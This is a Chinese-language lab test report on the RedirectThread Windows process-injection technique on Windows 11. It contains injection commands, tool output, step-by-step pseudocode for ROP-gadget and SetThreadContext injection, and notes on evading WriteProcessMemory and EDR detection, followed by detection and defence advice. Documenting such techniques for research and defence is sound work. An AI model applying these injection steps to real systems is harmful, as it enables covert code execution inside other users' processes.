# 技术40：RedirectThread - Context-Only Injection 测试报告

## 测试环境
- **操作系统**: Windows 11 Build 26100 (24H2)
- **测试时间**: 2025-10-09
- **实现来源**: 参考 Friends-Security/RedirectThread

## 技术原理

RedirectThread代表了进程注入技术的范式转移，专注于**仅执行原语(execution-only primitives)**，而不是传统的"分配→写入→执行"模式。

### 传统注入 vs RedirectThread

**传统模式**:
```
1. VirtualAllocEx() - 分配内存
2. WriteProcessMemory() - 写入shellcode
3. CreateRemoteThread() - 执行
```

**RedirectThread模式**:
```
跳过步骤1和2，仅专注于执行原语
```

### 核心创新点

#### 1. DLL指针注入
利用目标进程内存中已存在的字符串，无需分配或写入：
- 在ntdll.dll的只读数据段搜索字符串（如"0"）
- 使用CreateRemoteThread调用LoadLibraryA，参数指向找到的字符串
- 无需VirtualAllocEx或WriteProcessMemory

#### 2. ROP Gadget + CONTEXT操作
通过ROP（Return-Oriented Programming）gadget实现完整shellcode注入：

**核心Gadget**: `push r1; push r2; ret`

**执行流程**:
1. r1 = ExitThread地址
2. r2 = 目标函数地址
3. RIP指向gadget
4. 参数在RCX, RDX, R8, R9（x64调用约定）
5. gadget执行：push r1 → push r2 → ret（跳转到r2）
6. 函数执行完毕返回时，跳转到r1（ExitThread）

**三步注入流程**:
- **Step 1**: 通过ROP调用VirtualAlloc分配内存
- **Step 2**: 通过ROP逐字节调用RtlFillMemory写入shellcode
- **Step 3**: 通过ROP跳转到shellcode执行

### Delivery Methods对比

| Method | Windows 11支持 | 实现方式 |
|--------|--------------|---------|
| **CreateRemoteThread** | ✅ 成功 | CREATE_SUSPENDED + SetThreadContext |
| **NtCreateThread** | ❌ 失败 | 直接提供CONTEXT（受系统限制） |
| **QueueUserAPC** | 需测试 | APC队列注入 |

## 测试步骤

### 测试1：DLL指针注入

**准备测试DLL**:
```bash
cd techniques/40-redirect-thread

# 创建测试DLL源码
cat > test_dll.c << 'EOF'
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "RedirectThread DLL Loaded!", "Success", MB_OK);
    }
    return TRUE;
}
EOF

# 编译DLL
gcc -shared -o 0.dll test_dll.c -luser32
```

**执行注入**:
```bash
# 启动目标进程
notepad.exe &
# 获取PID: 22560

# 执行DLL指针注入
./redirect_thread.exe --dll-pointer 22560 "0"
```

### 测试2：NtCreateThread + ROP Gadget

```bash
./redirect_thread.exe --ntcreatethread 22560
```

### 测试3：官方实现对比

```bash
cd reference-redirect-thread

# 编译官方版本
"/c/Program Files/Microsoft Visual Studio/2022/Community/MSBuild/Current/Bin/MSBuild.exe" \
    RedirectThread.sln //p:Configuration=Release //p:Platform=x64

# 测试CreateRemoteThread方法
./x64/Release/RedirectThread.exe --pid 22560 \
    --inject-shellcode ShellcodeExamples/w10-x64-calc-shellcode-msfvenom.bin \
    --method CreateRemoteThread

# 测试NtCreateThread方法
./x64/Release/RedirectThread.exe --pid 22560 \
    --inject-shellcode ShellcodeExamples/w10-x64-calc-shellcode-msfvenom.bin \
    --method NtCreateThread
```

## 测试结果

### ✅ 测试1：DLL指针注入 - 成功

**我们的实现输出**:
```
========================================
RedirectThread - Context-Only Injection
========================================

[*] DLL Pointer Injection for: 0
[+] LoadLibraryA: 0x7ffb3f282d80
[+] Found '0' at: 0x7ffb404d5000
[*] Creating remote thread: LoadLibraryA("0")
[+] DLL injection completed

[+] Injection successful!
```

**验证结果**: MessageBox成功弹出，显示"RedirectThread DLL Loaded!"

**技术分析**:
- 成功在ntdll.dll的地址`0x7ffb404d5000`找到字符串"0"
- 利用ASLR会话级一致性，LoadLibraryA地址在注入器和目标进程相同
- CreateRemoteThread无需WriteProcessMemory即可传递参数
- 完全符合"Context-Only"理念

### ❌ 测试2：NtCreateThread + ROP - 失败

**我们的实现输出**:
```
[*] Starting NtCreateThread injection
[+] Found ROP gadget at: 0x7ffad4f8c4e1 (reg1=1, reg2=4)
[+] VirtualAlloc: 0x7ffb3f273c90
[+] ExitThread: 0x7ffb40368de0
[+] RtlFillMemory: 0x7ffb40476210
[*] Step 1: Allocating memory at 0x60000 (size: 4096)
[-] NtCreateThread failed: 0xc00000bb
[-] Failed to allocate memory
```

**错误码**: `0xc00000bb` = `STATUS_NOT_SUPPORTED`

**官方实现输出**（相同方法）:
```
[!] NtCreateThread failed with status: 0xc0000022
[!] Failed to allocate memory in the target process. Error: 0
```

**错误码**: `0xc0000022` = `STATUS_ACCESS_DENIED`

**分析**:
- Windows 11 Build 26100限制了NtCreateThread的CONTEXT操作
- 无论是我们的实现还是官方实现，NtCreateThread方法都失败
- 这是系统级安全加固，可能针对未文档化API的滥用

### ✅ 测试3：官方CreateRemoteThread + ROP - 成功

**官方实现输出**:
```
      RedirectThread - Context Injection Tool

[*] Target PID: 102548
[*] Injection Mode: Shellcode
[*] Delivery Method: CreateRemoteThread
[*] Context Method: ROP Gadget
[*] Allocation Size: 4096 bytes (0x1000)
[*] Allocation Address: 0x60000

[*] Starting injection process...
[*] Opened target process (PID=102548)

[+] Injection successful!
```

**验证结果**: Calculator成功弹出

**关键技术差异**:
```c
// 官方CreateRemoteThread方法（成功）:
hThread = CreateRemoteThread(..., gadget, ..., CREATE_SUSPENDED);
GetThreadContext(hThread, &ctx);
// 修改ctx.Rcx, ctx.Rdx, ctx.R8, ctx.R9（参数）
// 修改ctx寄存器（gadget需要的r1, r2）
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);

// NtCreateThread方法（失败）:
NtCreateThread(..., &ctx, ...);  // 直接提供CONTEXT - 被Windows 11阻止
```

## 实现对比

### 我们的简化实现

**支持的方法**:
- ✅ DLL Pointer Injection (CreateRemoteThread)
- ❌ Shellcode Injection via NtCreateThread (Windows 11限制)

**未实现的方法**:
- ⚠️ Shellcode Injection via CreateRemoteThread + SetThreadContext
- ⚠️ APC-based delivery (QueueUserAPC, NtQueueApcThreadEx2)
- ⚠️ Two-step thread hijacking

### 官方完整实现

**支持的Delivery Methods**:
- ✅ CreateRemoteThread
- ❌ NtCreateThread (Windows 11限制)
- ✅ QueueUserAPC
- ✅ NtQueueApcThread
- ✅ NtQueueApcThreadEx
- ✅ NtQueueApcThreadEx2

**支持的Context Methods**:
- ✅ ROP Gadget
- ✅ Two-Step Thread Hijacking

## 核心发现

### 1. Windows 11安全加固
Windows 11 Build 26100对NtCreateThread进行了限制：
- 禁止从外部进程创建线程时直接设置CONTEXT
- CreateRemoteThread + SetThreadContext仍然有效
- 这是继ProcessInstrumentationCallback、Special User APC之后的又一安全加固

### 2. ASLR会话级一致性
系统DLL在同一会话的所有进程中加载在相同地址：
```
注入器进程: LoadLibraryA = 0x7ffb3f282d80
目标进程:   LoadLibraryA = 0x7ffb3f282d80  ← 相同！
```
这使得DLL pointer injection无需任何地址解析即可工作。

### 3. ROP Gadget的普遍性
在可执行内存中搜索到的gadget（`push r1; push r2; ret`）:
- 地址: `0x7ffad4f8c4e1`
- 寄存器: r1=RBX(1), r2=RDI(4)
- 这种简单的gadget在ntdll.dll/kernel32.dll中广泛存在

### 4. CreateRemoteThread vs NtCreateThread
| 特性 | CreateRemoteThread | NtCreateThread |
|------|-------------------|----------------|
| **Windows 11支持** | ✅ 完全支持 | ❌ CONTEXT受限 |
| **挂起创建** | ✅ CREATE_SUSPENDED | ❌ 限制 |
| **SetThreadContext** | ✅ 可用 | N/A |
| **直接CONTEXT** | N/A | ❌ 被阻止 |
| **EDR监控** | ⚠️ 高 | ⚠️ 中（但无效） |

## 常见问题

### Q1: 为什么NtCreateThread在Windows 11上失败？
**A**: Windows 11 Build 26100加强了对未文档化NT API的限制。NtCreateThread允许直接提供CONTEXT结构，这被视为潜在的安全威胁。Microsoft逐步限制了这类底层API的能力。

### Q2: CreateRemoteThread + SetThreadContext为什么还能工作？
**A**: SetThreadContext是文档化的API，有合法的调试和工具使用场景。Microsoft保留了其功能，但可能在未来版本中也会限制。

### Q3: DLL pointer injection为什么不需要WriteProcessMemory？
**A**: 因为字符串已经存在于目标进程内存中（ntdll.dll的数据段）。我们只是找到它的地址并作为参数传递给LoadLibraryA。这完全绕过了内存写入检测。

### Q4: 如何实现我们缺失的CreateRemoteThread + ROP？
**A**:
```c
1. CreateRemoteThread(..., gadget_address, NULL, CREATE_SUSPENDED, ...)
2. GetThreadContext(hThread, &ctx)
3. 设置ctx.Rcx, ctx.Rdx, ctx.R8, ctx.R9（函数参数）
4. 设置ctx寄存器[regId1] = ExitThread地址
5. 设置ctx寄存器[regId2] = 目标函数地址
6. SetThreadContext(hThread, &ctx)
7. ResumeThread(hThread)
8. WaitForSingleObject(hThread, INFINITE)
```

## 优势与局限

### 优势
1. **绕过WriteProcessMemory检测**: 完全不调用WriteProcessMemory（shellcode通过RtlFillMemory写入）
2. **利用现有代码**: ROP gadget和DLL字符串都是目标进程已有的
3. **最小API足迹**: DLL注入只需CreateRemoteThread
4. **教育价值**: 展示CONTEXT结构的强大能力

### 局限
1. **性能问题**: 逐字节写入shellcode需要创建数百个线程
2. **噪音大**: 大量线程创建事件对EDR高度可见
3. **Gadget依赖**: 必须找到合适的ROP gadget
4. **稳定性**: 依赖ASLR一致性假设
5. **Windows 11限制**: NtCreateThread方法完全失效

## 检测与防御

### 检测方法
1. **线程创建模式**: 监控短时间内大量CREATE_SUSPENDED线程
2. **ROP Gadget检测**: 线程起始地址不在函数边界
3. **异常CONTEXT**: SetThreadContext设置非标准寄存器值
4. **内存填充模式**: RtlFillMemory被重复调用写入连续内存

### 防御建议
1. **监控CreateRemoteThread**: 记录所有跨进程线程创建
2. **CONTEXT完整性**: 检测SetThreadContext的异常使用
3. **Gadget签名**: 识别已知ROP gadget地址
4. **行为分析**: 关联线程创建、内存分配、函数调用模式

## 参考资源

- **原始研究**: https://github.com/Friends-Security/RedirectThread
- **博客文章**: [The CONTEXT-Only Attack Surface](https://blog.fndsec.net/2025/05/16/the-context-only-attack-surface/)
- **ROP原理**: [Return-Oriented Programming - Wikipedia](https://en.wikipedia.org/wiki/Return-oriented_programming)
- **NT API限制**: Windows 11安全加固研究

## 总结

RedirectThread技术展示了进程注入的创新思路，通过专注于执行原语而非传统的内存操作，开辟了新的攻击面。然而，Windows 11的安全加固（特别是对NtCreateThread的限制）表明Microsoft正在积极应对这类技术。

**当前可行方案（Windows 11）**:
- ✅ DLL Pointer Injection (CreateRemoteThread)
- ✅ CreateRemoteThread + ROP Gadget + SetThreadContext
- ❌ NtCreateThread + CONTEXT

这再次证明了攻防对抗的持续演进：新技术出现后，防御者快速响应，攻击者又寻找新的绕过方法。
